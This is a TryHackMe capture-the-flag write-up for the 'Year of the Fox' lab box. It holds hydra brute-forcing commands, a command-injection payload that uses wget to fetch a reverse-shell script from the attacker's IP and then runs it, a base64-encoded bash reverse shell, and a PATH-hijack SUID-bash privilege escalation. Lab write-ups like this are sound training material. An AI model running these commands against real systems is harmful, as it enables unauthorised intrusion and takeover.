# Tryhackme.com Room : Year of the Fox

`https://tryhackme.com/room/yotf`



## Instance

```
export IP='10.10.162.55'
```

## Nmap

```
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
| nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   YEAR-OF-THE-FOX<00>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<03>  Flags: <unique><active>
|   YEAR-OF-THE-FOX<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   YEAROFTHEFOX<00>     Flags: <group><active>
|   YEAROFTHEFOX<1d>     Flags: <unique><active>
|_  YEAROFTHEFOX<1e>     Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2021-05-14T01:52:37+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-14T00:52:37
|_  start_date: N/A
```



## Initial Foothold

The website on port `80` is protected by a password.

Let's take a look at the samba share.

There is 2 interesting shares :

```
YEAR-OF-THE-FOX
YEAROFTHEFOX
```

We try mounting the shares but we are asked for a password.



Running `smbmap -H 10.10.162.55` we get

```
		Disk			   Permissions  
        yotf               NO ACCESS  Fox's Stuff -- keep out!
```

Still no access



Running `enum4linux`

```
Got domain/workgroup name: YEAROFTHEFOX
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox      Name: fox       Desc:
[+] Password Info for Domain: YEAR-OF-THE-FOX

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)
```



Hmm, the `htaccess` prompt on port `80` says :

```
You want in? Gotta guess the password!
```

I guess we gotta bruteforce our way in ?

We launch `hydra` with users

```
rascal
fox
admin
```

and `rockyou`. Gonna go grab supper let's see if we get a hit in the mean time.

We get a hit !

```
rascal:piglet1
```

We land on a "search" page. Looking at the network requests, we see that it is doing a `post` on `/assets/php/search.php`

The input is somewhat filtered via some javascript, let's call the endpoint via `curl` :

```
curl -H 'Authorization: Basic cmFzY2FsOnBpZ2xldDE=' http://10.10.162.55/assets/php/search.php -H "Content-Type: application/json" -d '{"target":"*"}'
```

This wildcard query give us :

```
["creds2.txt","fox.txt","important-data.txt"]
```

Playing around around with the `target` we see that `$` result in an `invalid character` response. Is this being filtered & executed in a shell ?

We get code execution via ` ``cmd`` ` (One backtick, problems with escaping backticks in typora...)

`&` also result in an invalid character 

The easiest way is just to create a `rev.sh` file on our machine and retrieve it using `wget`.

Since we can't use `&`, we'll need 2 requests to activate our shell :

```
curl -H 'Authorization: Basic cmFzY2FsOm1pa2UwNw==' http://10.10.39.231/assets/php/search.php -H "Content-Type: application/json" -d '{"target":"`wget http://10.6.32.20:8000/rev.sh -O /tmp/rev.sh`"}'
```

```
curl -H 'Authorization: Basic cmFzY2FsOm1pa2UwNw==' http://10.10.39.231/assets/php/search.php -H "Content-Type: application/json" -d '{"target":"`/bin/bash /tmp/rev.sh`"}'
```

And we are in as `www-data`

Looking at `search.php` we see that this was executed with our input :

```
$query = exec("find ../../../files/* -iname \"*$target->target*\" | xargs");
```

We find the `web` flag in `/var/www/web-flag.txt` :

```
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
```

We retrieve the files that we saw earlier via the search query `/var/www/files/creds2.txt` :

```
LF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAXUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=
```

In `cyberchef` we do `base32` -> `base64` and we get 

```
c74341b26d29ad41da6cc68feedebd161103776555c21d77e3c2aa36d8c44730  -
```

Tried `from hex` but we get giberrish..

Maybe this is the password ?

Trying to `su` we get a `permission denied on /bin/su`



Looking at the services running on the box with `netstat -tulpn` we see:

```
tcp 0 0 127.0.0.1:22  0.0.0.0:* LISTEN      -
```

We don't have a `nc` binary but `curl 127.0.0.1:22` returns :

```
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
Protocol mismatch.
```

This port is only accessible locally.

We forward the port to our local machine using `chisel` :

```
Ours >> ./chisel server -p 8080 --reverse
box >> ./chisel client 10.6.32.20:8080 R:2222:127.0.0.1:22
```

At this point, I played around a lot with the strings that we got from `creds.txt` but couldn't find anything.. So I had a look at a write up to get a hint and well, we just needed to bruteforce the ssh password...

So here how we did it :

```
hydra -l fox -P /usr/share/wordlists/rockyou.txt -s 2222 127.0.0.1 ssh
```

And we find that the password is :

```
fox:querty
```



We are now logged in as `fox`.

We find `/home/fox/user-flag.txt` :

```
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
```



## Priv esc

in `/home/fox/samba` we find 2 files 

`cipher.txt` :

```
JV5FKMSNPJGTITTKKF5E46SZGJGXUVJSJZKFS6CONJCXUTTKJV4U26SBPJHUITJUJV5EC6SNPJMXSTL2MN5E6RCNGJGXUWJSJZCE2NKONJGTETLKLEZE26SBGIFE4VCZPBBWUTJUJZVEK6SNPJGXOTL2IV5E6VCNGRHGURL2JVVFSMSNPJTTETTKJUYE26SRPJGWUTJSJZVE2MSNNJMTCTL2KUZE2VCNGBGXUSL2JZVE2M2ONJEXUCSNNJGTGTL2JEZE4ULPPJHVITLXJZVEK6SPIREXOTLKIF4VURCCNBBWOPJ5BI======
```

Using `cyberchef` with `base32` -> `base64` -> `From Hex` we get :

```
5c8d7f5eaa6208803b7866d9cbf0ea8a30198a2f8f4426cbe5a4267b272e90a8  -
```

Hmm this is similar to what we got from `creds2.txt`



And `creds1.txt` :

```
JZVE26SPIRMTATTKKUZE42SNGVGXUVL2JZKE26CONJCXUTSUJUYE26TDPJHGUWLZJV5GG6SOIRGTGTL2IF5E6VCNGVGXUWJSJV5E26KNPJCXUT2EJV4U26SBPIFE42SZPFBWUWL2JZVEK6SNPJGXSTTKKEZE26SZPFGXU2ZSJZKFS6SONJITETSELEYE26SVPJHHUTJUJV5EKMSNKRGTATL2KUZE42SZGFGXUUL2JVVE2MCNPJMXUCSPKRMXUTL2LF5E453PPJHUIWJRJZVFS6SPIREXOTLKIF4VURCCNBBWOPJ5BI======
```

With the same `cyberchef` recipe we get :

```
c8def9551a5476b7470996c218206bca32dcb9ecddd5781a45fe42469c678ef8  -
```



Hmmm, not sure what to do with those.. Maybe `cipher.txt` is the key ?

Let's continue looking around the box for now.

`sudo -l` give us :

```
   (root) NOPASSWD: /usr/sbin/shutdown
```

Not much to do with this..

Actually, running `file /usr/sbin/shutdown` we get :

```
shutdown: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c855d329bb81903275997549d0856f9fcb1d40fd, not stripped
```

And running `file /usr/sbin/shutdown` on our machine give us :

```
/usr/sbin/shutdown: symbolic link to /bin/systemctl
```

Hmmm, let's dig a bit more into this.

We retrieve the binary using 

```
scp -P 2222 fox@127.0.0.1:/usr/sbin/shutdown .
```

We decompile it in `ghidra` and we get 

```c
void main(void)
{
  system("poweroff");
  return;
}
```

Pretty simple. Now the thing is that this binary is dynamically linked. Maybe we can inject something via `LD_PRELOAD` ?



We have `env_reset` in the `sudo -l` output so we can't use `LD_PRELOAD` and we don't have write access in `/etc` to write an `/etc/ld.so.preload`.



Hmm a this point I didn't really know what to do so I had a look at a write up for an hint.

And I overlooked a crucial detail. The `c` binary call `system("poweroff")` which doesn't specify the full path to `poweroff`.

I overlooked this because usually this wouldn't really matter since the `PATH` would be reset when using `sudo` but here we don't have a `secure_path` specified. Here is the output of `sudo -l` again :

```
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
```

I missed this detail.

So now we can simply

```
export PATH=/home/fox/bin:$PATH
```

Then we create `/home/fox/bin/poweroff`

```bash
#!/bin/bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```



Then we `/tmp/bash -p` and we are `root`.

We retrieve `/root/root.txt` and we get :

```
Not here -- go find!
```

The first place that comes to mind is `/home/rascal` and we find `/home/rascal/.did-you-think-I-was-useless.root` which contains :

```
T
H
M
{ODM3NTdk
MDljYmM4Z
jdhZWFhY2
VjY2Fk}

Here's the prize:

YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw
Mwo=
```



The flag is 

```
THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}
```



The "prize" decodes to 

```
a0274786e2a627078666d6467797046666766683b693232353a6968303
```

Not sure what to do with that.

Anyways, we have all the flags now

## Wrap up

* We could have used `socat` for the port forwarding :

  * ```
    /tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
    ```

* Always look if `secure_path` is set in `/etc/sudoers` I overlooked this and it was the key to getting root here

* Another way to bypass the `invalid characters` limitation when getting a shell is to encode our payload as `base64` and launch it using something like this:

  * ```
    echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjYuNjMvNDQ0NCAwPiYxCg== | base64 -d | bash
    ```

* The `creds*.txt` and `cipher.txt` were just rabbit holes... Made me loose quite some time..

* All in all, was a nice box, even tho I'm not a fan of bruteforcing password for entry. it's not a reflex for me since most boxes don't need bruteforcing but in the real world bruteforcing might be the only way so I guess that's a good rational to include bruteforcing in some boxes.

